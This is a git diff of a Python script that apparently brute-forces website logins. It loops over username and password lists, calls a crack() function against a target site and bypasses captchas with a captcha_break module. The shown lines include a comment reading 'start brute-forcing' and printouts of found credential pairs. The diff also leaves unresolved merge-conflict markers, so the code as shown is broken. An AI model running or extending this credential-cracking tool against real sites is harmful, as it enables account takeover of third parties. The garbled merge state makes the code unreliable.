@@ -3,7 +3,16 @@ import os
 import requests
 from bs4 import BeautifulSoup
 from tqdm import tqdm
-from app.util.captcha_break import predict_image
+
+try:
+    from app.util.captcha_break import predict_image
+except Exception:
+    import sys
+
+    _file_abspath = os.path.abspath(__file__)
+    sys.path.append(os.path.dirname(os.path.dirname(_file_abspath)))
+    print(sys.path)
+    from app.util.captcha_break import predict_image
 
 
 def check_successfully(content):
@@ -99,6 +108,7 @@ if __name__ == '__main__':
                     username_list.append(username)
                     password_list.append(password)
 
+<<<<<<< HEAD
     print('''
   ____        _      ____     
  |  _"\    U |"| u  / __"| u  
@@ -146,3 +156,14 @@ U| |_| |\| |_| |_,-.u___) |
                 print('\rNow find %d username and password pair(s)' % match_count)
 
     out.close()
+=======
+    # 开始爆破
+    for index in range(len(username_list)):
+        username = username_list[index]
+        password = password_list[index]
+        if len(username) <= 1 or len(password) <= 1:
+            continue
+        result, _, _ = crack(site, username, password)
+        if result:
+            print("Find correct username and password: %s - %s" % (username, password))
+>>>>>>> 56392e4e6e519cc7b4066c8ebd27e71b2d8118fb
